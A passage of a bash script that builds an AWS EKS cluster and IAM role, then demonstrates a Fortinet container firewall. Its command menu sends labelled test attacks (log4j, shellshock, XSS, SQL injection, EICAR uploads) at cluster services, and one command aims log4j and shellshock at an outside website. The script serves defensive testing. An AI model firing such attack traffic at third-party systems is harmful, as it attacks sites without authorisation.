        echo "✅ Metrics-server is already installed"
        return 0
    fi

    echo "Installing metrics-server for global region..."
    kubectl apply -f https://github.com/kubernetes-sigs/metrics-server/releases/latest/download/components.yaml

    # Wait for metrics-server deployment to be ready
    echo "Waiting for metrics-server to be ready..."
    kubectl -n kube-system wait deployment metrics-server --for condition=Available=True --timeout=300s
    
    if [ $? -eq 0 ]; then
        echo "✅ Metrics-server is ready"
    else
        echo "❌ Error: Metrics-server deployment failed to become ready"
        return 1
    fi
}

check_eks_cluster() {
    echo "aws eks describe-cluster --name $CLUSTERNAME --region $AWS_REGION --profile $AWS_PROFILE >/dev/null 2>&1"
    
    if aws eks describe-cluster --name $CLUSTERNAME --region $AWS_REGION --profile $AWS_PROFILE >/dev/null 2>&1; then
        return 0 # Cluster exists
    else
        return 1 # Cluster doesn't exist
    fi
}


install_keda_with_helm() {
    # Add KEDA Helm repository
    helm repo add kedacore https://kedacore.github.io/charts

    # Update Helm repositories
    helm repo update

    # Install KEDA in keda namespace
    helm install keda kedacore/keda --namespace keda --create-namespace
}

install_keda_with_yaml_ecr() {
    # Download KEDA yaml
    # Try primary download URL first

    local keda_version="2.12.1"
    local yaml_file="keda-${keda_version}.yaml"
    local primary_url="https://github.com/kedacore/keda/releases/download/v${keda_version}/keda-${keda_version}.yaml"
    


    if ! download_yaml "${primary_url}" "${yaml_file}"; then
        echo "Primary download failed, trying alternative China region URL..."
        
        # Try alternative China region URL
        if ! download_yaml "${ALTERNATIVEDOWNLOADURL}/${yaml_file}" "${yaml_file}"; then 
            echo "❌ Error: Failed to download KEDA YAML from both sources"
            exit 1
        fi
        echo "✅ Successfully downloaded KEDA YAML from alternative source"
    else
        echo "✅ Successfully downloaded KEDA YAML from primary source"
    fi


    # Replace image repository from ghcr.io to ECR

    if [[ "$OSTYPE" == "darwin"* ]]; then
        # macOS version
        sed -i '' "s|ghcr.io/kedacore/|${MYIMAGEREPO}/|g" keda-2.12.1.yaml
    else
        # Linux version
        sed -i "s|ghcr.io/kedacore/|${MYIMAGEREPO}/|g" keda-2.12.1.yaml
    fi

    # Apply the modified yaml
    kubectl apply  --server-side  -f keda-2.12.1.yaml

    # Clean up the downloaded file
    #rm keda-2.12.1.yaml
}

cleanup() {
    rm -f node-trust-policy.json
    rm -f way3cluster.yaml
}




# Function to determine if we're in China region
is_china_region() {
    [[ $AWS_REGION == cn-* ]]
}

function delete_cloudformation_stack() {

    local stack_name="eksctl-${CLUSTERNAME}-cluster"
    echo "aws cloudformation describe-stacks --stack-name "$stack_name" --region $AWS_REGION --profile $AWS_PROFILE >/dev/null 2>&1"
    if aws cloudformation describe-stacks --stack-name "$stack_name" --region $AWS_REGION --profile $AWS_PROFILE >/dev/null 2>&1; then
        echo "Stack exists, deleting stack $stack_name..."
        aws cloudformation delete-stack --stack-name "$stack_name" --region $AWS_REGION --profile $AWS_PROFILE
        echo "Stack exists and deletion initiated"
        return 0 # Stack exists and deletion initiated
    else
        return 1 # Stack doesn't exist
    fi
}

check_cloudformation_stack() {
    local stack_name="eksctl-${CLUSTERNAME}-cluster"
    
    echo "Checking CloudFormation stack status..."
    echo "aws cloudformation describe-stacks --stack-name "$stack_name" --region $AWS_REGION --profile $AWS_PROFILE >/dev/null 2>&1"
    
    if aws cloudformation describe-stacks --stack-name "$stack_name" --region $AWS_REGION --profile $AWS_PROFILE >/dev/null 2>&1; then
#        echo "Stack exists, deleting stack $stack_name..."
#        aws cloudformation delete-stack --stack-name "$stack_name" --region $AWS_REGION --profile $AWS_PROFILE
#        echo "Stack exists and deletion initiated"
        return 0 # Stack exists and deletion initiated
    else
        return 1 # Stack doesn't exist
    fi
}

# Function to wait for stack deletion
wait_for_stack_deletion() {
    local stack_name="eksctl-${CLUSTERNAME}-cluster"
    local max_attempts=60  # 30 minutes (30 seconds * 60)
    local attempt=1

    echo "Waiting for CloudFormation stack deletion..."
    
    while [ $attempt -le $max_attempts ]; do
        if ! check_cloudformation_stack; then
            echo "✅ CloudFormation stack has been deleted successfully"
            return 0
        fi
        
        echo "Still waiting for stack deletion... Attempt $attempt of $max_attempts"
        sleep 30
        attempt=$((attempt + 1))
    done

    echo "❌ Timeout waiting for stack deletion after 30 minutes"
    return 1
}

create_node_role() {
    # Check if role already exists
    echo "aws iam get-role --role-name eksNodeRole --profile $AWS_PROFILE 2>/dev/null" 
    if ! aws iam get-role --role-name eksNodeRole --profile $AWS_PROFILE 2>/dev/null; then
        # Create trust policy document with dynamic EC2 service
        cat << EOF > node-trust-policy.json
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Effect": "Allow",
      "Principal": {
        "Service": "${EC2_SERVICE}"
      },
      "Action": "sts:AssumeRole"
    }
  ]
}
EOF

        # Create the IAM role
        aws iam create-role \
            --role-name eksNodeRole \
            --assume-role-policy-document file://node-trust-policy.json \
            --profile $AWS_PROFILE || return 1

        # Attach required policies with dynamic ARN prefix
        aws iam attach-role-policy \
            --role-name eksNodeRole \
            --policy-arn ${IAM_PREFIX}:iam::aws:policy/AmazonEKSWorkerNodePolicy \
            --profile $AWS_PROFILE || return 1

        aws iam attach-role-policy \
            --role-name eksNodeRole \
            --policy-arn ${IAM_PREFIX}:iam::aws:policy/AmazonEKS_CNI_Policy \
            --profile $AWS_PROFILE || return 1

        aws iam attach-role-policy \
            --role-name eksNodeRole \
            --policy-arn ${IAM_PREFIX}:iam::aws:policy/AmazonEC2ContainerRegistryReadOnly \
            --profile $AWS_PROFILE || return 1

        aws iam attach-role-policy \
            --role-name eksNodeRole \
            --policy-arn ${IAM_PREFIX}:iam::aws:policy/AmazonSSMManagedInstanceCore \
            --profile $AWS_PROFILE || return 1

        echo "Waiting for role to be fully created..."
        sleep 10
    else
        echo "Role eksNodeRole already exists"
    fi
} 
create_cluster_only() {
    # Check if CloudFormation stack exists
    trap cleanup EXIT

    if check_cloudformation_stack; then
        echo "Error: CloudFormation stack for cluster $CLUSTERNAME still exists"
        echo "Please wait for complete cleanup before creating a new cluster"
        exit 1
    fi  # This was the issue - missing 'fi'

    create_node_role

    PODCIDR="10.244.0.0/16"
    AVAILABILITY_ZONES=$(aws ec2 describe-availability-zones --region $AWS_REGION --profile $AWS_PROFILE --query "AvailabilityZones[?State=='available'].ZoneName" --output text | tr '\t' ',' | cut -d',' -f1-2)
    filename="way3cluster.yaml"
    cat > $filename << EOF
apiVersion: eksctl.io/v1alpha5
kind: ClusterConfig
availabilityZones: [$(echo $AVAILABILITY_ZONES | tr ',' '\n' | sed 's/^/"/' | sed 's/$/"/' | paste -sd ',' -)]
metadata:
  version: "${EKSVERSION}"
  name: $CLUSTERNAME
  region: $AWS_REGION

privateCluster:
  enabled: ${ISPRIVATE}
  additionalEndpointServices:
    - "cloudformation"
    - "autoscaling"

iam:
  withOIDC: true

vpc:
  autoAllocateIPv6: false
  cidr: ${PODCIDR}
  clusterEndpoints:
    privateAccess: true
    publicAccess: true
  nat:
    gateway: HighlyAvailable

accessConfig:
  bootstrapClusterCreatorAdminPermissions: true
  authenticationMode: API 

kubernetesNetworkConfig:
  ipFamily: IPv4
  serviceIPv4CIDR: ${SERVICEIPV4CIDR}

addons:
  - name: vpc-cni
    version: latest
  - name: kube-proxy
    version: latest
  - name: coredns
    version: latest
  - name: metrics-server
    version: latest
  - name: eks-pod-identity-agent
    version: latest
EOF

    # Check if file was created successfully
    if [ ! -f "$filename" ]; then
        echo "Error: Failed to create cluster configuration file"
        exit 1
    fi

    eksctl create cluster -f $filename --profile $AWS_PROFILE --without-nodegroup
}


function create_eks_worker_node_key_pair () {

# Variables
KEY_NAME="my_key_pair_eks_cfos_demo"
KEY_PATH="$HOME/.ssh/id_rsa.pub"

echo creating keypair with name $KEY_NAME with $KEY_PATH

# Check if the public key exists
if [ ! -f "$KEY_PATH" ]; then
    echo "Public key not found at $KEY_PATH. Creating a new key pair..."
    ssh-keygen -t rsa -b 2048 -f "$HOME/.ssh/id_rsa" -N ""
    echo "Key pair created."
else
    echo "Public key found at $KEY_PATH."
fi

# Check if the key pair already exists in AWS
EXISTING_KEY=$(aws ec2 describe-key-pairs --key-name "$KEY_NAME" --query 'KeyPairs[0].KeyName' --output text 2>/dev/null)

if [ "$EXISTING_KEY" == "$KEY_NAME" ]; then
    echo "Key pair $KEY_NAME already exists in AWS. Deleting it..."
    aws ec2 delete-key-pair --key-name "$KEY_NAME"
    echo "Existing key pair deleted."
fi

# Import the public key into AWS
echo "Importing the public key into AWS..."
aws ec2 import-key-pair --key-name "$KEY_NAME" --public-key-material fileb://"$KEY_PATH"
echo "Key pair imported successfully."

}

create_nodegroups() {
    echo "Creating nodegroups only..."

    AWS_ACCOUNT_ID=$(aws sts get-caller-identity --query Account --output text --profile $AWS_PROFILE)
    SUBNET_IDS=$(aws ec2 describe-subnets \
        --filters "Name=vpc-id,Values=$(aws eks describe-cluster --name $CLUSTERNAME --region $AWS_REGION --profile $AWS_PROFILE --query 'cluster.resourcesVpcConfig.vpcId' --output text)" \
        --query 'Subnets[*].SubnetId' \
        --output text \
	--region $AWS_REGION \
        --profile $AWS_PROFILE)
    echo $SUBNET_IDS

echo "Creating Key $KEY_NAME for ssh into worker node" 

create_eks_worker_node_key_pair

    # Create nodegroups
    for ng in "ng-app" "ng-security"; do
        echo "Creating nodegroup: $ng"
        if [ "$ng" == "ng-app" ]; then
            labels="role=worker,app=true"
        else
            labels="role=worker,security=true"
        fi

        aws eks create-nodegroup \
            --cluster-name $CLUSTERNAME \
            --nodegroup-name $ng \
            --scaling-config minSize=0,maxSize=3,desiredSize=${DESIREDWORKERNODESIZE} \
            --instance-types t2.large \
            --node-role ${IAM_PREFIX}:iam::${AWS_ACCOUNT_ID}:role/eksNodeRole \
            --subnets ${SUBNET_IDS} \
            --labels $labels \
            --region $AWS_REGION \
            --profile $AWS_PROFILE \
            --remote-access ec2SshKey=$KEY_NAME
    done

    # Wait for nodegroups to be ready
    echo "Waiting for nodegroups to be ready..."
    for ng in "ng-app" "ng-security"; do
        echo "Waiting for nodegroup $ng to be active..."
        while true; do
            STATUS=$(aws eks describe-nodegroup \
                --cluster-name $CLUSTERNAME \
                --nodegroup-name $ng \
                --region $AWS_REGION \
                --profile $AWS_PROFILE \
                --query 'nodegroup.status' \
                --output text)
            
            echo "Nodegroup $ng status: $STATUS"
            
            if [ "$STATUS" == "ACTIVE" ]; then
                echo "Nodegroup $ng is now active"
                break
            elif [ "$STATUS" == "FAILED" ] || [ "$STATUS" == "CREATE_FAILED" ]; then
                echo "❌ Nodegroup $ng creation failed"
                return 1
            fi
            
            echo "Still waiting for nodegroup $ng to be active..."
            sleep 30
        done
    done

    echo "✅ All nodegroups are ready"
}

function create_apply_cfos_configmap_demo1() {
    filename="cfosconfigmapwebprofiledemo1.yaml"
    cat << EOF | tee $filename
apiVersion: v1
data:
  config: |-
    config log syslogd setting
      set status enable
      set server "fazcfos2025.eastus.cloudapp.azure.com"
      set interface "eth0"
    end
    config webfilter profile
    edit "demo1"
        config ftgd-wf
            set options error-allow
        end
    end
    config application list
      edit "demo1"
        set comment "block http file upload"
        set extended-log enable
          config entries
             edit 1
                set category 15
                set application 18123
                set action block
             next
             edit 2
                set category 15
                set application 17136
                set action block
             next
          end
      next
    end
  type: partial
kind: ConfigMap
metadata:
  labels:
    app: fos
    category: config
  name: demo1configmap
EOF
kubectl apply -f $filename || failed to apply configmap $filename
}

delete_cluster_eks() {
    echo "Starting cluster deletion process..."
    
    # Check if cluster exists first
    echo "aws eks describe-cluster --name $CLUSTERNAME --region $AWS_REGION --profile $AWS_PROFILE >/dev/null 2>&1"
    if ! aws eks describe-cluster --name $CLUSTERNAME --region $AWS_REGION --profile $AWS_PROFILE >/dev/null 2>&1; then
        echo "Cluster $CLUSTERNAME does not exist"
    else
        # Delete nodegroups first
        for ng in "ng-app" "ng-security"; do
        echo "aws eks describe-nodegroup --cluster-name $CLUSTERNAME --nodegroup-name $ng --region $AWS_REGION --profile $AWS_PROFILE >/dev/null 2>&1"
            if aws eks describe-nodegroup --cluster-name $CLUSTERNAME --nodegroup-name $ng --region $AWS_REGION --profile $AWS_PROFILE >/dev/null 2>&1; then
                echo "Deleting nodegroup: $ng"
                aws eks delete-nodegroup \
                    --nodegroup-name $ng \
                    --cluster-name $CLUSTERNAME \
                    --region $AWS_REGION \
                    --profile $AWS_PROFILE

                echo "Waiting for nodegroup $ng to be deleted..."
                while true; do
                    if ! aws eks describe-nodegroup \
                        --cluster-name $CLUSTERNAME \
                        --nodegroup-name $ng \
                        --region $AWS_REGION \
                        --profile $AWS_PROFILE >/dev/null 2>&1; then
                        echo "Nodegroup $ng has been deleted"
                        break
                    fi
                    echo "Still waiting for nodegroup $ng to be deleted..."
                    sleep 30
                done
            else
                echo "Nodegroup $ng not found"
            fi
        done

        # Delete the cluster
        echo "Deleting cluster: $CLUSTERNAME"
        eksctl delete cluster \
            --name $CLUSTERNAME \
            --region $AWS_REGION \
            --profile $AWS_PROFILE

        # Wait for CloudFormation stack to be fully deleted
        wait_for_stack_deletion
    fi

    # Delete IAM role and its policies
    echo "aws iam get-role --role-name eksNodeRole --profile $AWS_PROFILE >/dev/null 2>&1" 
    if aws iam get-role --role-name eksNodeRole --profile $AWS_PROFILE >/dev/null 2>&1; then
        echo "Deleting IAM role policies..."
        
        # Detach policies
        aws iam detach-role-policy \
            --role-name eksNodeRole \
            --policy-arn ${IAM_PREFIX}:iam::aws:policy/AmazonEKSWorkerNodePolicy \
            --profile $AWS_PROFILE

        aws iam detach-role-policy \
            --role-name eksNodeRole \
            --policy-arn ${IAM_PREFIX}:iam::aws:policy/AmazonEKS_CNI_Policy \
            --profile $AWS_PROFILE

        aws iam detach-role-policy \
            --role-name eksNodeRole \
            --policy-arn ${IAM_PREFIX}:iam::aws:policy/AmazonEC2ContainerRegistryReadOnly \
            --profile $AWS_PROFILE

        aws iam detach-role-policy \
            --role-name eksNodeRole \
            --policy-arn ${IAM_PREFIX}:iam::aws:policy/AmazonSSMManagedInstanceCore \
            --profile $AWS_PROFILE 

        echo "Deleting IAM role..."
        aws iam delete-role --role-name eksNodeRole --profile $AWS_PROFILE
    else
        echo "IAM role eksNodeRole not found"
    fi
    
    echo "✅ Cluster and IAM role deletion process completed"
}

# Function to print usage
print_usage() {
echo "demo                 - demo on k8s cluster for both ingress and egress use case"
echo "createAKScluster     - create AKS cluster"
echo "addlabel             - add node app=true and security=true to each node"
echo "applyCFOSLicense     - Apply cFOS licene file cfos_license.yaml"  
echo "createcFOSlicensefile- create cFOS licenseconfigmap file from .lic file" 
echo "deploycFOSwithAgent  - Deploy CFOS and vxlan agent with helm chart"
echo "createIngressDemo    - createIngressDemo for juiceshop"
echo "sendAttacktocFOSSVC  - send attack to cFOSheadlesssvc for ingress security test" 
echo "sendAttackToExternal - send attack to external website"
echo "sendWebftoExternal   - send webf to external for egress security test"
echo "sendAttackToClusterIP- send attack traffic to clusterip svc for egress security test"
echo "createSLB            - createinternalslbforjuiceshop and send ips traffic"  
echo "sendTrafficToLB      - send attack traffic to both internalexternal lb for ingress security test"
echo "checkCFOSLog         - check cFOS log, policy10 is ingress policy, policy300 is egress policy"
echo  "deleteCFOSandAgent   - deleteCFOSandAgent" 
echo  "getKubeConfig        - get GKE cluster kubeconfig"
echo  "gkeNetworkPolicy1    - only allow default namespace to access security namespace"
exit 1
}

# Main execution
if [ $# -lt 1 ]; then
    echo "❌ wrong command"
    print_usage
fi

# Set region based on second argument
if [ "$2" == "china" ]; then
	echo ''
#    set_china_aws_variable
else
	echo ''
#    set_global_aws_variable
fi

# Execute based on command argument
case "$1" in
    demo)
      demo_managedk8s
       ;;
    createAKScluster)
       create_aks_cluster "westus" "cfosdemowandy" || echo create_aks_cluster failed 
       ;;
    addlabel)
       #add_label_to_node "agentpool=ubuntu" "app=true" || echo command skipped
       #add_label_to_node "agentpool=worker" "security=true" || echo command skipped
       add_label_to_node "kubernetes.io/os=linux" "security=true" "app=true" || echo command skipped 
       #add_label_to_node "kubernetes.io/os=linux" "security=true" || echo command skipped
       
        ;;
    deployDemoPod)
	juiceshopClusterIPAddress=$(kubectl get svc kube-dns -n kube-system -o jsonpath='{.spec.clusterIP}' | cut -d'.' -f1-3 | sed 's/$/.252/') 
        deploy_demo_pod $juiceshopClusterIPAddress || exit 1
        ;;
    createcFOSlicensefile)
        create_license_configmap || exit 1
	;;
    applyCFOSLicense)
	CFOSLICENSEYAMLFILE="cfos_license.yaml"
	applyCFOSLicense || exit 1 
	;;
    deploycFOSwithAgent)
	deploy_cfos_with_agent "cfos7210250-deployment-new"  || exit 1
	updatecFOSsignuatre
	;;
    createIngressDemo)
        create_ingress_demo || echo create_ingress_demo exit
	;;
    sendAttacktocFOSSVC)
        attacktype=("normal" "log4j" "shellshock" "xss" "user_agent_malware" "sql_injection" "normalfileupload" "segdownload" "eicarupload") 
       sendattack_to_headlesssvc_cfos "${attacktype[@]}" 

        ;;
    sendWebftoExternal)
       urllist=("https://www.fortiguard.com/wftest/26.html" "https://120.wap517.biz" "https://www.casino.org") 
       send_waf_attack "app=diag2" "backend" "${urllist[@]}" || echo send_waf_attack exit
        ;;

    sendAttackToExternal)
      
       attacktype=("normal" "log4j" "shellshock")

       for attack in "${attacktype[@]}" ; do 
          send_attack_traffic 'app=diag2' 'backend' 'cfostest-vip-juiceshop' 'default' $attack "ips.0" "https://www.hackthebox.com/"
       done

       ;;

    sendAttackToClusterIP)
       attacktype=("normal" "log4j" "shellshock" "xss" "user_agent_malware" "sql_injection" "normalfileupload" "segdownload" "eicarupload") 
       sendattack_to_clusteripsvc "juiceshop-service" "security" "${attacktype[@]}" || echo sendattack_to_clusteripsvc
        ;;
    createSLB)
        create_internallb_juiceshop_new 
        create_externallb_juiceshop 
        #service.beta.kubernetes.io/azure-dns-label-name: cfostestjuiceshop
        #cfostestjuiceshop.westus.cloudapp.azure.com  
        ;; 
    sendTrafficToLB)
        send_traffic_to_lb "app=diag2" "backend" "ip" "log4j"
        send_traffic_to_lb "app=diag2" "backend" "ip" "shellshock"
        send_traffic_to_lb "app=diag2" "backend" "ip" "xss"
        ;;
    checkCFOSLog)

        log_files=("traffic.0" "ips.0" "virus.0" "app.0" "webf.0")
        check_cFOS_log "${log_files[@]}" "app=firewall" 3
        ;; 
     cleanCFOSLog)  

       log_files=("traffic.0" "ips.0" "virus.0" "app.0" "webf.0")
       cleancfoslog "${log_files[@]}" "app=firewall" 3  
        ;; 
    deleteCFOSandAgent)
       deleteCFOSandAgent "cfos7210250-deployment-new" 
       ;;
    getKubeConfig)
       get_kube_config
       ;;
    gkeNetworkPolicy1)
       gke_network_policy_allow_default_security_namespace
       ;;
    *)    
       print_usage
       ;;
esac
